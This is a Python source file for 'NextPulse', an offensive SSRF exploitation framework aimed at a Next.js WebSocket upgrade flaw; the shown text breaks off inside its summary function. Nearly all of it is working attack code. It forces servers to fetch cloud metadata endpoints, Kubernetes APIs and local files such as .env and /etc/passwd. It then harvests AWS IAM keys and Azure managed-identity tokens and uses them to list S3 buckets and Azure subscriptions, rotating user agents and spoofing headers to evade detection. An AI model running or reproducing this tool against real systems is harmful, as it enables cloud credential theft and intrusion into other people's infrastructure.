#!/usr/bin/env python3
"""
NextPulse — CVE-2026-44578 Advanced SSRF Exploitation Framework
Next.js WebSocket Upgrade Handler SSRF
Affected Versions: 13.4.13 → 15.5.15 | 16.0.0 → 16.2.4
Fixed Versions: 15.5.16 / 16.2.5 (self-hosted only)
Repository: @DeathShotXD / NextPulse
"""

import argparse
import json
import random
import re
import signal
import socket
import ssl
import sys
import threading
import time
import urllib.parse
import urllib.error
import urllib.request
from datetime import datetime
from queue import Empty, Queue

# ─────────────────────────────────────────────────────────────
# Core Palette
# ─────────────────────────────────────────────────────────────
C_RST   = "\033[0m"
C_BLD   = "\033[1m"
C_DIM   = "\033[2m"

# Main Identity
C_CYAN  = "\033[38;5;51m"
C_BLUE  = "\033[38;5;45m"
C_ICE   = "\033[38;5;117m"
C_WHITE = "\033[38;5;255m"

# Alerts / States
C_RED   = "\033[38;5;196m"
C_PINK  = "\033[38;5;198m"
C_AMBER = "\033[38;5;220m"
C_GRN   = "\033[38;5;82m"

# Special Effects
C_PANEL = "\033[38;5;39m"
C_MUTED = "\033[38;5;240m"

WS_KEY = "dGhlIHNhbXBsZSBub25jZQ=="

USER_AGENTS = [
    "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/119.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
]

CTX = ssl.create_default_context()
CTX.check_hostname = False
CTX.verify_mode = ssl.CERT_NONE

_lock = threading.Lock()
_results = []
_exit = 0

VULN_RANGES = [((13, 4, 13), (15, 5, 15)), ((16, 0, 0), (16, 2, 4))]

CLOUD_PROBES = {
    "aws": [("http://169.254.169.254/latest/meta-data/", ["ami-id", "instance-id", "hostname", "iam/", "block-device-mapping"])],
    "azure": [("http://169.254.169.254/metadata/instance?api-version=2021-02-01", ["azEnvironment", "subscriptionId", "vmId"])],
    "gcp": [("http://metadata.google.internal/computeMetadata/v1/", ["instance/", "project/"])],
    "do": [("http://169.254.169.254/metadata/v1.json", ["droplet_id", "hostname", "interfaces"])],
    "oracle": [("http://169.254.169.254/opc/v1/instance/", ["compartmentId", "displayName"])],
    "alibaba": [("http://100.100.100.200/latest/meta-data/", ["instance-id", "image-id", "zone-id"])],
    "kubernetes": [("http://kubernetes.default.svc/api/v1/", ["namespaces", "pods", "services"])],
}

CLOUD_TARGETS = {
    "aws": [
        ("AWS IMDSv1 Metadata Base", "http://169.254.169.254/latest/meta-data/"),
        ("AWS IMDSv1 Hostname", "http://169.254.169.254/latest/meta-data/hostname"),
        ("AWS IMDSv1 Credentials Directory", "http://169.254.169.254/latest/meta-data/iam/security-credentials/"),
        ("AWS IMDSv1 Provisioning User Data", "http://169.254.169.254/latest/user-data"),
        ("AWS IMDSv1 Unique Instance ID", "http://169.254.169.254/latest/meta-data/instance-id"),
        ("AWS IMDSv1 Machine Image Identity", "http://169.254.169.254/latest/meta-data/ami-id"),
        ("AWS IMDSv1 Account Context Info", "http://169.254.169.254/latest/meta-data/identity-credentials/ec2/info"),
    ],
    "azure": [
        ("Azure IMDS Compute Instance Metadata", "http://169.254.169.254/metadata/instance?api-version=2021-02-01"),
        ("Azure IMDS OAuth Active Directory Token", "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"),
    ],
    "gcp": [
        ("GCP Metadata Active Project Identity", "http://metadata.google.internal/computeMetadata/v1/project/project-id"),
        ("GCP Metadata Active IAM Token Store", "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"),
    ],
    "do": [
        ("DigitalOcean Metadata Droplet Vector", "http://169.254.169.254/metadata/v1.json"),
    ],
    "oracle": [
        ("Oracle OCI Metadata Core Instance Profile", "http://169.254.169.254/opc/v1/instance/"),
    ],
    "alibaba": [
        ("Alibaba Cloud Metadata Primary Engine Path", "http://100.100.100.200/latest/meta-data/"),
    ],
    "kubernetes": [
        ("Kubernetes Cluster Native API Endpoint", "http://kubernetes.default.svc/api/v1/"),
    ],
    "leex": [
        ("Local Environment Variable Store", "http://127.0.0.1/.env"),
        ("Local System Process Environments", "http://127.0.0.1/proc/self/environ"),
        ("Node Dependency Definition File", "http://127.0.0.1/package.json"),
        ("Production Runtime Config Descriptor", "http://127.0.0.1/config/production.json"),
        ("Local System Authorization Map", "http://127.0.0.1/etc/passwd"),
    ]
}

def banner():
    print(f"""{C_CYAN}
 ███╗   ██╗███████╗██╗  ██╗████████╗██████╗ ██╗   ██╗██╗     ███████╗███████╗
 ████╗  ██║██╔════╝╚██╗██╔╝╚══██╔══╝██╔══██╗██║   ██║██║     ██╔════╝██╔════╝
 ██╔██╗ ██║█████╗   ╚███╔╝    ██║   ██████╔╝██║   ██║██║     ███████╗█████╗
 ██║╚██╗██║██╔══╝   ██╔██╗    ██║   ██╔═══╝ ██║   ██║██║     ╚════██║██╔══╝
 ██║ ╚████║███████╗██╔╝ ██╗   ██║   ██║     ╚██████╔╝███████╗███████║███████╗
 ╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝   ╚═╝   ╚═╝      ╚═════╝ ╚══════╝╚══════╝╚══════╝
{C_RST}""")
    print(f"{C_PANEL}╔══════════════════════════════════════════════════════════════════════════════╗{C_RST}")
    print(f"{C_PANEL}║{C_RST} {C_PINK}{C_BLD}NextPulse :: Advanced Next.js SSRF Exploitation Framework{C_RST}                    {C_PANEL}║{C_RST}")
    print(f"{C_PANEL}╠══════════════════════════════════════════════════════════════════════════════╣{C_RST}")
    print(f"{C_PANEL}║{C_RST} {C_WHITE}{C_BLD}Research Vector{C_RST} : CVE-2026-44578 / WebSocket Upgrade SSRF                    {C_PANEL}║{C_RST}")
    print(f"{C_PANEL}║{C_RST} {C_WHITE}{C_BLD}Core Modules{C_RST}    : Cloud Metadata • Middleware • Internal Fetch               {C_PANEL}║{C_RST}")
    print(f"{C_PANEL}║{C_RST} {C_WHITE}{C_BLD}Framework Build{C_RST} : v3.5.0-PULSE Offensive Research Edition                    {C_PANEL}║{C_RST}")
    print(f"{C_PANEL}║{C_RST} {C_WHITE}{C_BLD}Runtime Profile{C_RST} : Multi-Target • Interactive • Auto Extraction               {C_PANEL}║{C_RST}")
    print(f"{C_PANEL}║{C_RST} {C_WHITE}{C_BLD}Repository{C_RST}      : @DeathShotXD / NextPulse                                   {C_PANEL}║{C_RST}")
    print(f"{C_PANEL}╚══════════════════════════════════════════════════════════════════════════════╝{C_RST}\n")
    print(f"{C_BLUE}[>] Initializing NextPulse exploitation engine...{C_RST}")
    print(f"{C_ICE}[>] Loading middleware fingerprinting modules...{C_RST}")
    print(f"{C_CYAN}[>] Establishing SSRF pulse synchronization...{C_RST}\n")

def info(msg): print(f"{C_BLUE}[INFO]{C_RST} {msg}")
def warn(msg): print(f"{C_AMBER}[WARN]{C_RST} {msg}")
def err(msg): print(f"{C_RED}[FAIL]{C_RST} {msg}")
def step(msg): print(f"{C_CYAN}[STEP]{C_RST} {C_BLD}{msg}{C_RST}")
def dim(msg): print(f"{C_MUTED}{msg}{C_RST}")

def hit(msg):
    print(f"""
{C_PINK}{C_BLD}╔══════════════════════════════════════════════════════════════════════════════╗
║                            SSRF VECTOR CONFIRMED                             ║
╚══════════════════════════════════════════════════════════════════════════════╝{C_RST}
{C_WHITE}[+] Targeted Endpoint Exploit Hit Context: {msg}{C_RST}
""")

def sc(code):
    if code == 200: return C_GRN
    if code in (301, 302, 307, 308): return C_AMBER
    if code in (401, 403, 404): return C_PINK
    if code >= 500: return C_RED
    return C_MUTED

def get_ua():
    return random.choice(USER_AGENTS)

def generate_evasion_headers():
    base = [
        "Connection: Upgrade",
        "Upgrade: websocket",
        "Sec-WebSocket-Version: 13",
        f"Sec-WebSocket-Key: {WS_KEY}",
    ]
    random.shuffle(base)
    return "\r\n".join(base)

def ssrf(host, port, use_ssl, ssrf_url, timeout=10):
    ua = get_ua()
    evasion = generate_evasion_headers()
    raw = (f"GET {ssrf_url} HTTP/1.1\r\n"
           f"Host: {host}\r\n"
           f"{evasion}\r\n"
           f"User-Agent: {ua}\r\n"
           f"X-Forwarded-For: 127.0.0.1\r\n"
           f"X-Real-IP: 127.0.0.1\r\n"
           f"X-Client-IP: 127.0.0.1\r\n\r\n").encode()
    try:
        s = socket.create_connection((host, port), timeout=timeout)
        s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        if use_ssl:
            s = CTX.wrap_socket(s, server_hostname=host)
        s.sendall(raw)
        s.settimeout(timeout)
        buf = b""
        try:
            while len(buf) < 524288:
                chunk = s.recv(32768)
                if not chunk: break
                buf += chunk
        except socket.timeout: pass
        s.close()
        resp = buf.decode(errors="replace")
        m = re.match(r'HTTP/[\d.]+ (\d+)', resp)
        code = int(m.group(1)) if m else 0
        body = resp.split("\r\n\r\n", 1)[1] if "\r\n\r\n" in resp else resp
        return code, body
    except Exception as e:
        return 0, str(e)

def parse_target(url):
    p = urllib.parse.urlparse(url)
    hostname = p.hostname
    if not hostname and p.path:
        hostname = p.path.split('/')[0]
    port = p.port or (443 if p.scheme == "https" else 80)
    return hostname, port, p.scheme == "https"

def is_nextjs(body):
    return any(x in body for x in ["/_next/static", "/_next/chunks", 'charSet="utf-8"', '__NEXT_DATA__'])

def parse_ver(s):
    m = re.search(r'(\d+)\.(\d+)\.(\d+)', s or "")
    return tuple(int(x) for x in m.groups()) if m else None

def is_vulnerable(ver):
    if not ver: return None
    for lo, hi in VULN_RANGES:
        if lo <= ver <= hi: return True
    return False

def analyze_headers(headers_dict):
    server = (headers_dict.get("Server", "") + headers_dict.get("server", "")).lower()
    via = (headers_dict.get("Via", "") + headers_dict.get("via", "")).lower()
    powered = (headers_dict.get("X-Powered-By", "") + headers_dict.get("x-powered-by", "")).lower()
    proxies = []
    if "nginx" in server or "nginx" in via: proxies.append("Nginx")
    if "cloudflare" in server: proxies.append("Cloudflare")
    if "cloudfront" in via: proxies.append("AWS CloudFront")
    if "akamai" in server: proxies.append("Akamai")
    return {"proxies": proxies, "powered_by": powered, "server_header": server}

def detect_nextjs(base, timeout=8):
    result = {"nextjs": False, "version": None, "version_str": None, "vulnerable": None, "proxy_blocked": False, "fingerprint": {}}
    paths = ["/_next/static/", "/", "/api/health", "/_next/webpack-hmr", "/_next/data/"]
    for path in paths:
        try:
            req = urllib.request.Request(base + path, headers={"User-Agent": get_ua(), "Accept": "*/*"})
            with urllib.request.urlopen(req, timeout=timeout, context=CTX) as r:
                body = r.read(16384).decode(errors="replace")
                hdrs = dict(r.headers)
                fprint = analyze_headers(hdrs)
                result["fingerprint"] = fprint
                if "Nginx" in fprint["proxies"]:
                    result["proxy_blocked"] = True
                srv = fprint["powered_by"] + fprint["server_header"]
                if "next" in srv.lower() or path == "/_next/static/":
                    result["nextjs"] = True
                m = re.search(r'["\']?next["\']?\s*:\s*["\'](\d+\.\d+\.\d+)["\']', body) or re.search(r'Next\.js[/ ]v?(\d+\.\d+\.\d+)', body)
                if m:
                    ver = parse_ver(m.group(1))
                    result.update(version=ver, version_str=m.group(1), nextjs=True, vulnerable=is_vulnerable(ver))
                    break
        except Exception: pass
    return result

def detect_cloud(host, port, use_ssl, timeout=8):
    step("Executing cloud perimeter scanning routine...")
    found = {}
    for provider, probes in CLOUD_PROBES.items():
        for url, hints in probes:
            code, body = ssrf(host, port, use_ssl, url, timeout)
            if code == 200 and not is_nextjs(body):
                hits = [h for h in hints if h.lower() in body.lower()]
                if hits:
                    found[provider] = {"url": url, "hints": hits}
                    info(f"Target cloud infrastructure identified: {C_AMBER}{C_BLD}{provider.upper()}{C_RST} -> Vector targets: {hits}")
                    break
            time.sleep(random.uniform(0.01, 0.03))
    if not found:
        dim("Cloud metadata profiling matrix returned no responsive footprints")
    return found

def render(body, max_lines=30):
    try:
        obj = json.loads(body)
        out = []
        for line in json.dumps(obj, indent=2).splitlines()[:max_lines]:
            k = line.split('":')[0].strip().strip('"').lower()
            color = C_CYAN + C_BLD if any(s in k for s in ['key', 'secret', 'token', 'password', 'access', 'cred', 'auth', 'private']) else ""
            out.append(f"   {color}{line}{C_RST if color else ''}")
        return "\n".join(out)
    except Exception:
        return "\n".join(f"   {l}" for l in body.strip().splitlines()[:max_lines])

def hit_box(title, data):
    print(f"\n{C_PANEL}╔═══════════════════════════════════════════════════════════════════════════════════════════╗{C_RST}")
    print(f"{C_PANEL}║{C_RST}  {C_PINK}{C_BLD}EXFILTRATION RECORD: {title}{C_RST}")
    print(f"{C_PANEL}╚═══════════════════════════════════════════════════════════════════════════════════════════╝{C_RST}")
    for k, v in data.items():
        if len(str(v)) > 60:
            print(f"   {C_ICE}{k:<28}{C_RST} :\n     {C_GRN}{C_BLD}{str(v)}{C_RST}")
        else:
            print(f"   {C_ICE}{k:<28}{C_RST} : {C_GRN}{C_BLD}{str(v)}{C_RST}")
    print(f"{C_PANEL}╚═══════════════════════════════════════════════════════════════════════════════════════════╝{C_RST}\n")

def validate_aws_creds(ak, sk, token="", region="us-east-1"):
    step("Validating and escalating extracted AWS credentials...")
    try:
        import boto3
        session = boto3.Session(aws_access_key_id=ak, aws_secret_access_key=sk, aws_session_token=token if token else None, region_name=region)
        sts = session.client('sts')
        identity = sts.get_caller_identity()
        info(f"AWS Credential Token Status: {C_GRN}VALID{C_RST} | Account context: {C_WHITE}{identity.get('Account')}{C_RST} | Identity ARN: {C_CYAN}{identity.get('Arn')}{C_RST}")
        try:
            s3 = session.client('s3')
            buckets = s3.list_buckets().get('Buckets', [])
            if buckets:
                hit(f"AWS RECON PRIVILEGE ESCALATION — {len(buckets)} S3 Storage Elements Exposed")
                for b in buckets[:5]:
                    dim(f"   • Data Bucket Route: {b['Name']}")
        except Exception:
            dim("Storage tier access check: Principal restricted or zero buckets matched")
        return identity
    except ImportError:
        warn("Boto3 package dependency missing from operational environment profile")
        return None
    except Exception as e:
        warn(f"Credential validation tracking error: {e}")
        return None

def exploit_azure_token(token_string):
    step("Validating and mapping captured Azure system identity tokens...")
    try:
        req = urllib.request.Request(
            "https://management.azure.com/subscriptions?api-version=2020-01-01",
            headers={"Authorization": f"Bearer {token_string}", "User-Agent": get_ua()}
        )
        with urllib.request.urlopen(req, timeout=8, context=CTX) as r:
            body = r.read().decode(errors="replace")
            data = json.loads(body)
            subs = data.get("value", [])
            if subs:
                hit(f"AZURE SUBSCRIPTION ENUMERATION SUCCESS — {len(subs)} Operational Subscriptions Leaked")
                for s in subs[:5]:
                    dim(f"   • Subscription Node: {s.get('displayName')} ({s.get('subscriptionId')})")
    except Exception as e:
        dim(f"Azure tenant hierarchy query interface returned error code: {e}")

def run_leex_parsing(body_content):
    secrets = re.findall(r'(?:password|secret|key|token|auth|credential|db_||config)[=:]\s*[\"\'\w\-\.\+\/]+', body_content, re.I)
    if secrets:
        hit_box("LOCAL LOOPBACK PIPELINE CONFIGURATION EXFILTRATED", {
            "Matched Identifiers Matrix Summary": str(secrets[:5])
        })
    return secrets

def exploit_aws(host, port, use_ssl, timeout=8):
    results = {}
    print(f"\n{C_PANEL}╒═══════════════════════════════════════════════════════════════════════════════════════════╕{C_RST}")
    print(f"│ {C_PINK}{C_BLD}AWS Environment Infrastructure Assessment and Target Exfiltration Loop{C_RST}                    │")
    print(f"{C_PANEL}╘═══════════════════════════════════════════════════════════════════════════════════════════╛{C_RST}")

    print(f"{C_CYAN}[1/3]{C_RST} {C_WHITE}{C_BLD}Instance Diagnostics Profiling{C_RST}")
    targets = [
        ("Instance ID", "http://169.254.169.254/latest/meta-data/instance-id"),
        ("Instance Type", "http://169.254.169.254/latest/meta-data/instance-type"),
        ("Hostname Target Reference", "http://169.254.169.254/latest/meta-data/hostname"),
        ("Local Core IPv4 Vector", "http://169.254.169.254/latest/meta-data/local-ipv4"),
        ("Public Boundary IPv4 Target", "http://169.254.169.254/latest/meta-data/public-ipv4"),
        ("Machine Image Identity (AMI)", "http://169.254.169.254/latest/meta-data/ami-id"),
        ("Infrastructure Region Vector", "http://169.254.169.254/latest/meta-data/placement/region"),
        ("Availability Zone Context", "http://169.254.169.254/latest/meta-data/placement/availability-zone"),
        ("Account Owner Profile Block", "http://169.254.169.254/latest/meta-data/identity-credentials/ec2/info"),
    ]
    for name, url in targets:
        code, body = ssrf(host, port, use_ssl, url, timeout)
        val = body.strip()[:160] if (code == 200 and not is_nextjs(body)) else None
        print(f"   {sc(code)}[{code}]{C_RST} {C_ICE}{name:<32}{C_RST} : {C_GRN if val else C_DIM}{val or 'Null Response'}{C_RST}")
        if val: results[name] = val
        time.sleep(random.uniform(0.01, 0.02))

    print(f"\n{C_CYAN}[2/3]{C_RST} {C_WHITE}{C_BLD}IAM Security Architecture Discovered{C_RST}")
    code, body = ssrf(host, port, use_ssl, "http://169.254.169.254/latest/meta-data/iam/security-credentials/", timeout)
    role = None
    if code == 200 and not is_nextjs(body) and body.strip():
        role = body.strip().splitlines()[0].strip()
        info(f"Target system node role scope verified: {C_CYAN}{C_BLD}{role}{C_RST}")
        results["iam_role"] = role
    else:
        code2, body2 = ssrf(host, port, use_ssl, "http://169.254.169.254/latest/meta-data/iam/info", timeout)
        if code2 == 200 and not is_nextjs(body2):
            try:
                arn = json.loads(body2).get("InstanceProfileArn", "")
                if arn:
                    role = arn.split("/")[-1]
                    info(f"Target infrastructure IAM role discovered via system ARN profile: {C_CYAN}{C_BLD}{role}{C_RST}")
                    results["iam_role"] = role
            except Exception: pass
        if not role:
            dim("Cloud platform node identity evaluation complete: zero structural roles exposed")

    print(f"\n{C_CYAN}[3/3]{C_RST} {C_WHITE}{C_BLD}Cryptographic Token Harvest Protocol{C_RST}")
    if role:
        code, body = ssrf(host, port, use_ssl, f"http://169.254.169.254/latest/meta-data/iam/security-credentials/{role}", timeout)
        if code == 200 and not is_nextjs(body):
            try:
                creds = json.loads(body)
                ak = creds.get("AccessKeyId", "")
                sk = creds.get("SecretAccessKey", "")
                tok = creds.get("Token", "")
                if ak and sk:
                    print(f"\n{C_PANEL}╔═══════════════════════════════════════════════════════════════════════════════════════════╗{C_RST}")
                    print(f"{C_PANEL}║{C_RST}  {C_PINK}{C_BLD} EXFILTRATION RECORD: AWS ACTIVE INFRASTRUCTURE SECURITY ACCESS PAYLOADS INTERCEPTED {C_RST}      ║")
                    print(f"{C_PANEL}╚═══════════════════════════════════════════════════════════════════════════════════════════╝{C_RST}")
                    print(f"   {C_ICE}{'Identity Role Context':<28}{C_RST} : {C_GRN}{C_BLD}{role}{C_RST}")
                    print(f"   {C_ICE}{'AccessKeyId':<28}{C_RST} : {C_GRN}{C_BLD}{ak}{C_RST}")
                    print(f"   {C_ICE}{'SecretAccessKey':<28}{C_RST} : {C_GRN}{C_BLD}{sk}{C_RST}")
                    print(f"   {C_ICE}{'Session Token':<28}{C_RST} : {C_GRN}{C_BLD}{tok}{C_RST}")
                    print(f"   {C_ICE}{'Token Expiration Window':<28}{C_RST} : {C_GRN}{C_BLD}{creds.get('Expiration', '')}{C_RST}")
                    print(f"{C_PANEL}╚═══════════════════════════════════════════════════════════════════════════════════════════╝{C_RST}\n")

                    results["credentials"] = creds
                    results["verify_cmd"] = f"AWS_ACCESS_KEY_ID={ak} AWS_SECRET_ACCESS_KEY={sk} AWS_SESSION_TOKEN={tok} aws sts get-caller-identity"
                    print(f" {C_AMBER}>> Manual Validation Command Execution Payload:{C_RST}\n  {C_MUTED}{results['verify_cmd']}{C_RST}\n")
                    validate_aws_creds(ak, sk, tok)
                else:
                    print(render(body, 12))
            except Exception:
                print(body[:500])
        else:
            print(f"   {sc(code)}[{code}]{C_RST} Secure location target endpoint trace returned an empty response")

    code, body = ssrf(host, port, use_ssl, "http://169.254.169.254/latest/user-data", timeout)
    if code == 200 and not is_nextjs(body) and body.strip():
        secrets = re.findall(r'(?:password|secret|key|token|auth|credential)[=:]\s*\S+', body, re.I)
        if secrets:
            hit_box("HARDCODED PROVISIONING SECRET KEYS ENCOUNTERED INSIDE USER-DATA CONFIG", {"Matched Signatures Vector": str(secrets[:5])})
        else:
            info(f"Target node server provisioning script captured ({len(body)} structural bytes)")
            print(f"   {C_MUTED}{body[:300]}{C_RST}")
        results["user_data"] = body[:1000]

    return results

def exploit_azure(host, port, use_ssl, timeout=8):
    results = {}
    print(f"\n{C_PANEL}╒═══════════════════════════════════════════════════════════════════════════════════════════╕{C_RST}")
    print(f"│ {C_PINK}{C_BLD}Azure Platform Infrastructure Cloud Assessment and Security Key Discovery Module{C_RST}          │")
    print(f"{C_PANEL}╘═══════════════════════════════════════════════════════════════════════════════════════════╛{C_RST}")
    code, body = ssrf(host, port, use_ssl, "http://169.254.169.254/metadata/instance?api-version=2021-02-01", timeout)
    if code == 200 and not is_nextjs(body):
        try:
            data = json.loads(body)
            compute = data.get("compute", {})
            info("Azure Managed Topology Infrastructure Matrix Properties:")
            for k in ["vmId", "name", "resourceGroupName", "subscriptionId", "location", "vmSize"]:
                v = compute.get(k, "")
                if v:
                    print(f"   {C_WHITE}{k:<30}{C_RST} : {v}")
                    results[k] = v
        except Exception:
            print(body[:400])

    code, body = ssrf(host, port, use_ssl, "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/", timeout)
    if code == 200 and not is_nextjs(body):
        try:
            td = json.loads(body)
            tok = td.get("access_token", "")
            if tok:
                print(f"\n{C_PANEL}╔═══════════════════════════════════════════════════════════════════════════════════════════╗{C_RST}")
                print(f"{C_PANEL}║{C_RST}  {C_PINK}{C_BLD} EXFILTRATION RECORD: AZURE MANAGED IDENTITY INFRASTRUCTURE TOKEN DUMPED {C_RST}              ║")
                print(f"{C_PANEL}╚═══════════════════════════════════════════════════════════════════════════════════════════╝{C_RST}")
                print(f"   {C_ICE}{'Bearer Access Token':<28}{C_RST} :\n     {C_GRN}{C_BLD}{tok}{C_RST}")
                print(f"   {C_ICE}{'Token Structure Class':<28}{C_RST} : {C_GRN}{C_BLD}{td.get('token_type', '')}{C_RST}")
                print(f"   {C_ICE}{'Active Lease Lifetime':<28}{C_RST} : {C_GRN}{C_BLD}{td.get('expires_in', '')}{C_RST}")
                print(f"{C_PANEL}╚═══════════════════════════════════════════════════════════════════════════════════════════╝{C_RST}\n")
                results["azure_token"] = tok
                exploit_azure_token(tok)
        except Exception: pass
    return results

def interactive(target_url, timeout=10):
    host, port, use_ssl = parse_target(target_url)
    session = {"target": target_url, "results": {}, "history": [], "telemetry": {"total_requests": 0, "bytes_transferred": 0}}
    print(f"""
{C_PANEL}╔═══════════════════════════════════════════════════════════════════════════════════════════╗{C_RST}
{C_PANEL}║{C_RST}  {C_BLUE}{C_BLD}NextPulse Platform Shell Engine Stream Active Terminal Session Console{C_RST}                   {C_PANEL}║{C_RST}
{C_PANEL}║{C_RST}  {C_WHITE}Connected Node Reference Address{C_RST} : {C_CYAN}{C_BLD}{host}:{port}{C_RST} {'(Secure Transport Link)' if use_ssl else '(Plain Stream TCP Tunnel)'}             {C_PANEL}║{C_RST}
{C_PANEL}╚═══════════════════════════════════════════════════════════════════════════════════════════╝{C_RST}
""")
    IMDS = [
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/latest/meta-data/ami-id",
        "http://169.254.169.254/latest/meta-data/hostname",
        "http://169.254.169.254/latest/meta-data/instance-type",
        "http://169.254.169.254/latest/meta-data/iam/info",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "http://169.254.169.254/latest/user-data",
        "http://100.100.100.200/latest/meta-data/",
        "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
        "http://kubernetes.default.svc/api/v1/",
        "http://127.0.0.1/.env"
    ]

    def do(url):
        print(f"   {C_MUTED}→ Dispatching payload state mapping vector: {url}{C_RST}")
        session["telemetry"]["total_requests"] += 1
        code, body = ssrf(host, port, use_ssl, url, timeout)
        session["telemetry"]["bytes_transferred"] += len(body)
        html = is_nextjs(body)
        print(f"   {sc(code)}[HTTP {code}]{C_RST} ({len(body)} total bytes verified)" + (f" {C_AMBER}[Upstream returned next framework execution layout -- injection context dropped]{C_RST}" if html else ""))
        if not html and body.strip():
            print(render(body))
            if "127.0.0.1" in url or "localhost" in url:
                run_leex_parsing(body)
        session["history"].append({"url": url, "code": code, "timestamp": time.time()})
        return code, body

    while True:
        try:
            cmd = input(f"{C_CYAN}nextpulse{C_MUTED}::{C_WHITE}core{C_RST}({C_ICE}{host[:20]}{C_RST}) {C_PINK}» {C_RST}").strip()
        except (EOFError, KeyboardInterrupt): break
        if not cmd: continue
        if cmd in ("q", "quit", "exit"): break

        if cmd == "help":
            print("    cloud     Cloud provider detection\n    scan      Full auto detection + exploit\n    aws       AWS IMDSv1 full extraction\n    azure     Azure IMDS token extraction\n    url <url> Custom SSRF (http:// only)\n    get <N>   Run preset target\n    list      Show presets\n    history   Request history\n    telemetry Traffic stats\n    save      Export session\n    quit      Exit")
        elif cmd == "cloud": detect_cloud(host, port, use_ssl, timeout)
        elif cmd == "aws": exploit_aws(host, port, use_ssl, timeout)
        elif cmd == "azure": exploit_azure(host, port, use_ssl, timeout)
        elif cmd == "scan":
            clouds = detect_cloud(host, port, use_ssl, timeout)
            if "aws" in clouds: exploit_aws(host, port, use_ssl, timeout)
            elif "azure" in clouds: exploit_azure(host, port, use_ssl, timeout)
            else:
                for u in ["http://127.0.0.1/.env", "http://127.0.0.1/proc/self/environ", "http://kubernetes.default.svc/api/v1/"]: do(u)
        elif cmd.startswith("url "):
            url = cmd[4:].strip()
            if url.startswith("http://"): do(url)
            else: warn("http:// protocol required on port 80")
        elif cmd.startswith("get "):
            try: do(IMDS[int(cmd.split()[1])])
            except Exception: warn("Invalid index")
        elif cmd == "list":
            for i, u in enumerate(IMDS): print(f"   {C_AMBER}[{i}]{C_RST} {u}")
        elif cmd == "history":
            for h in session["history"][-15:]: print(f"   {sc(h['code'])}[{h['code']}]{C_RST} {h['url']}")
        elif cmd == "telemetry":
            print(f"   Requests : {session['telemetry']['total_requests']}")
            print(f"   Bytes    : {session['telemetry']['bytes_transferred']}")
        elif cmd == "save":
            ts = datetime.now().strftime("%Y%m%d_%H%M%S")
            fname = f"nextpulse_{host}_{ts}.json"
            with open(fname, "w") as f: json.dump(session, f, indent=2, default=str)
            info(f"Session saved: {fname}")
        elif cmd.startswith("http://"): do(cmd)

def scan(target, args):
    global _exit
    target = target.strip()
    if not target.startswith("http"): target = "https://" + target

    dim(f"Analyzing logical structure vectors for: {target}")
    det = detect_nextjs(target, args.timeout)
    vs = det.get("version_str") or "unknown"
    vuln = det.get("vulnerable")

    if not det["nextjs"]:
        dim(f"Not Next.js: {target}")
        return {}

    if det.get("proxy_blocked"):
        warn(f"Nginx proxy detected on target")

    vs_color = {True: C_RED, False: C_GRN, None: C_AMBER}[vuln]
    vs_label = {True: "VULNERABLE CONFIGURATION PROFILES CONFIRMED", False: "PATCH SECURITY PROFILE STACK VERIFIED SECURE", None: "FRAMEWORK VERSION PROFILE OUTSIDE ASSIGNED DEFINITION GRID"}[vuln]
    info(f"{C_WHITE}{target}{C_RST} — Next.js/{vs} — {vs_color}{C_BLD}{vs_label}{C_RST}")

    if vuln is False and not args.force:
        return {"target": target, "version": vs, "vulnerable": False, "ssrf_hits": [], "scan_epoch": time.time()}

    host, port, use_ssl = parse_target(target)
    result = {"target": target, "version": vs, "vulnerable": vuln, "ssrf_hits": [], "scan_epoch": time.time()}

    targets_list = []
    if args.ssrf:
        targets_list = [("Custom", args.ssrf)]
    else:
        cloud = args.cloud or "aws"
        if cloud == "all":
            for lst in CLOUD_TARGETS.values(): targets_list.extend(lst)
        else:
            targets_list = CLOUD_TARGETS.get(cloud, CLOUD_TARGETS["aws"])

    step(f"Testing {len(targets_list)} vectors on {target}")
    for desc, url in targets_list:
        dim(f"   → {url}")
        code, body = ssrf(host, port, use_ssl, url, args.timeout)
        time.sleep(random.uniform(0.01, 0.02))

        html = is_nextjs(body)
        is_hit = False
        evidence = ""

        if "Failed to proxy http:/" in body or (code == 200 and not html):
            is_hit = True
            evidence = body[:1000]
            if "127.0.0.1" in url or "localhost" in url: run_leex_parsing(body)

        if re.search(r'AKIA[0-9A-Z]{16}|"AccessKeyId".*"SecretAccessKey"', body):
            is_hit = True
            evidence = body[:1200]
            hit(f"AWS CREDENTIALS EXFILTRATED via {url}")

        if is_hit:
            hit(f"SSRF CONFIRMED — {desc}")
            print(f"   URL   : {url}")
            print(f"   Status: {sc(code)}HTTP {code}{C_RST}")
            if evidence: print(render(evidence, 20))
            result["ssrf_hits"].append({"desc": desc, "url": url, "status": code, "timestamp": time.time()})
            with _lock: _exit = max(_exit, 2)

    if not result["ssrf_hits"] and vuln:
        with _lock: _exit = max(_exit, 1)

    return result

def worker(q, args):
    while True:
        try: t = q.get(timeout=1)
        except Empty: break
        try:
            r = scan(t, args)
            if r:
                with _lock: _results.append(r)
        except Exception as e:
            err(f"Error on {t}: {e}")
        finally: q.task_done()

def summary(results):
    vuln = [r for r in results if r.get("vulnerable")]
    hits = [r for r in results if r.get("ssrf_hits")]
    print(f"\n{C_PANEL}═╤═════════════════════════════════════════════════════════════════════════════════════════╤═{C_RST}")
    print(f" │ {C_WHITE}{C_BLD}NextPulse Scan Summary Engine Metrics{C_RST}                                                   │")
    print(f"{C_PANEL}═╧═════════════════════════════════════════════════════════════════════════════════════════╧═{C_RST}")
